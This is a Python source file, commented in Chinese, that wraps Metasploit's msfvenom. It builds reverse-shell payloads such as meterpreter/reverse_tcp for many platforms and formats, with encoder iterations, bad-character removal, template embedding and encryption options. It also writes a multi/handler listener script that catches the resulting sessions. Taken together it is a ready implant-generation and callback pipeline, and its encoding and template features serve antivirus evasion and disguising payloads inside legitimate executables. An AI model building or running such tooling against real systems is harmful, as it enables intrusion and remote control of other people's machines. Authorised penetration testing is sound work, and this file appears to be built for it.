#!/usr/bin/env python3
"""
Payload生成器
负责生成各种类型的payload
"""

import os
import subprocess
import hashlib
import logging
from typing import List, Dict, Optional, Any
from pathlib import Path

from config import Config, MetasploitInstaller
from msf_manager import retry_on_failure

logger = logging.getLogger(__name__)


class PayloadGenerator:
    """Payload生成器"""
    
    def __init__(self, msf_manager):
        self.msf_manager = msf_manager
        
        # 检查msfvenom是否可用
        if not MetasploitInstaller.check_msfvenom():
            raise RuntimeError("msfvenom 不可用")
        
        # 支持的平台
        self.supported_platforms = [
            'windows', 'linux', 'osx', 'android', 'php',
            'python', 'java', 'ruby', 'nodejs', 'cmd', 'powershell'
        ]
        
        # 支持的架构
        self.supported_architectures = [
            'x86', 'x64', 'x86_64', 'arm', 'armle', 'armbe',
            'mips', 'mipsle', 'mipsbe', 'ppc', 'sparc'
        ]
        
        # 支持的输出格式
        self.output_formats = [
            'exe', 'dll', 'elf', 'macho', 'apk', 'war', 'jar',
            'php', 'asp', 'aspx', 'jsp', 'py', 'rb', 'pl',
            'c', 'csharp', 'java', 'python', 'ruby', 'powershell',
            'hex', 'raw', 'base64'
        ]
    
    @retry_on_failure(max_retries=2, delay=1)
    def generate(self, payload_type: str, lhost: str, lport: int,
                output_file: str, output_format: str = None,
                arch: str = None, platform: str = None,
                encoder: str = None, iterations: int = 1,
                bad_chars: str = None, template: str = None,
                **kwargs) -> tuple:
        """
        生成payload
        
        Args:
            payload_type: payload类型 (如 windows/meterpreter/reverse_tcp)
            lhost: 监听主机
            lport: 监听端口
            output_file: 输出文件路径
            output_format: 输出格式
            arch: 架构
            platform: 平台
            encoder: 编码器
            iterations: 编码迭代次数
            bad_chars: 坏字符
            template: 模板文件
            **kwargs: 其他选项
        
        Returns:
            (success, message/error)
        """
        try:
            # 构建命令
            cmd = self._build_command(
                payload_type=payload_type,
                lhost=lhost,
                lport=lport,
                output_file=output_file,
                output_format=output_format,
                arch=arch,
                platform=platform,
                encoder=encoder,
                iterations=iterations,
                bad_chars=bad_chars,
                template=template,
                **kwargs
            )
            
            logger.info(f"执行命令: {' '.join(cmd)}")
            
            # 执行命令
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if result.returncode != 0:
                error_msg = result.stderr or result.stdout
                logger.error(f"生成payload失败: {error_msg}")
                return False, f"生成失败: {error_msg}"
            
            # 验证文件
            if not os.path.exists(output_file):
                return False, "输出文件未生成"
            
            # 获取文件信息
            file_info = self._get_file_info(output_file)
            
            success_msg = f"Payload已生成: {output_file}\n"
            success_msg += f"文件大小: {file_info['size']} bytes\n"
            success_msg += f"MD5: {file_info['md5']}\n"
            success_msg += f"SHA256: {file_info['sha256']}"
            
            logger.info(success_msg)
            
            return True, success_msg
        
        except subprocess.TimeoutExpired:
            return False, "生成payload超时"
        except Exception as e:
            logger.error(f"生成payload出错: {e}")
            return False, f"生成出错: {e}"
    
    def _build_command(self, payload_type: str, lhost: str, lport: int,
                      output_file: str, output_format: str = None,
                      arch: str = None, platform: str = None,
                      encoder: str = None, iterations: int = 1,
                      bad_chars: str = None, template: str = None,
                      **kwargs) -> List[str]:
        """构建msfvenom命令"""
        cmd = ["msfvenom"]
        
        # Payload类型
        cmd.extend(["-p", payload_type])
        
        # LHOST和LPORT
        cmd.append(f"LHOST={lhost}")
        cmd.append(f"LPORT={lport}")
        
        # 架构
        if arch:
            cmd.extend(["-a", arch])
        
        # 平台
        if platform:
            cmd.extend(["--platform", platform])
        
        # 输出格式
        if output_format:
            cmd.extend(["-f", output_format])
        
        # 输出文件
        cmd.extend(["-o", output_file])
        
        # 编码器
        if encoder and encoder != "无" and encoder != "none":
            cmd.extend(["-e", encoder])
            if iterations > 1:
                cmd.extend(["-i", str(iterations)])
        
        # 坏字符
        if bad_chars:
            cmd.extend(["-b", bad_chars])
        
        # 模板
        if template and os.path.exists(template):
            cmd.extend(["-x", template])
            cmd.append("-k")  # 保持模板功能
        
        # 其他选项
        if kwargs.get('smallest'):
            cmd.append("--smallest")
        
        if kwargs.get('nopsled'):
            cmd.extend(["-n", str(kwargs['nopsled'])])
        
        if kwargs.get('pad'):
            cmd.extend(["--pad", str(kwargs['pad'])])
        
        if kwargs.get('encrypt'):
            cmd.extend(["--encrypt", kwargs['encrypt']])
            if kwargs.get('encrypt_key'):
                cmd.extend(["--encrypt-key", kwargs['encrypt_key']])
        
        return cmd
    
    def _get_file_info(self, filepath: str) -> Dict[str, Any]:
        """获取文件信息"""
        file_info = {
            'path': filepath,
            'size': 0,
            'md5': '',
            'sha1': '',
            'sha256': ''
        }
        
        try:
            # 文件大小
            file_info['size'] = os.path.getsize(filepath)
            
            # 计算哈希
            with open(filepath, 'rb') as f:
                file_data = f.read()
                file_info['md5'] = hashlib.md5(file_data).hexdigest()
                file_info['sha1'] = hashlib.sha1(file_data).hexdigest()
                file_info['sha256'] = hashlib.sha256(file_data).hexdigest()
        
        except Exception as e:
            logger.error(f"获取文件信息失败: {e}")
        
        return file_info
    
    def generate_handler_script(self, payload_type: str, lhost: str, lport: int,
                               output_file: str, **kwargs) -> str:
        """生成handler脚本"""
        script_lines = [
            "use exploit/multi/handler",
            f"set PAYLOAD {payload_type}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
        ]
        
        # 添加额外选项
        for key, value in kwargs.items():
            if value:
                script_lines.append(f"set {key.upper()} {value}")
        
        script_lines.append("exploit -j -z")
        
        # 写入文件
        script_file = output_file + ".rc"
        with open(script_file, 'w') as f:
            f.write('\n'.join(script_lines))
        
        logger.info(f"Handler脚本已生成: {script_file}")
        
        return script_file
    
    def list_payloads(self, platform: str = None, arch: str = None) -> List[str]:
        """列出可用的payload"""
        payloads = self.msf_manager.get_modules_by_type('payloads')
        
        # 过滤
        filtered = []
        for payload in payloads:
            if platform and payload['platform'] != platform:
                continue
            if arch and payload.get('arch') != arch:
                continue
            filtered.append(payload['name'])
        
        return filtered
    
    def list_encoders(self, platform: str = None, arch: str = None) -> List[str]:
        """列出可用的编码器"""
        encoders = self.msf_manager.get_modules_by_type('encoders')
        
        # 过滤
        filtered = ['无']  # 添加"无"选项
        for encoder in encoders:
            if platform and encoder['platform'] != platform:
                continue
            if arch and encoder.get('arch') != arch:
                continue
            filtered.append(encoder['name'])
        
        return filtered
    
    def list_formats(self) -> List[str]:
        """列出可用的输出格式"""
        return self.output_formats
    
    def get_payload_info(self, payload_name: str) -> Optional[Dict[str, Any]]:
        """获取payload信息"""
        return self.msf_manager.get_module_info(payload_name)


if __name__ == "__main__":
    # 测试payload生成器
    from config import Config
    from msf_manager import MSFModuleManager
    
    Config.init()
    
    msf_manager = MSFModuleManager()
    generator = PayloadGenerator(msf_manager)
    
    print("\n测试列出payloads...")
    payloads = generator.list_payloads(platform='windows')
    print(f"找到 {len(payloads)} 个 Windows payload")
    
    if payloads:
        print(f"示例: {payloads[0]}")
    
    print("\n测试列出编码器...")
    encoders = generator.list_encoders()
    print(f"找到 {len(encoders)} 个编码器")
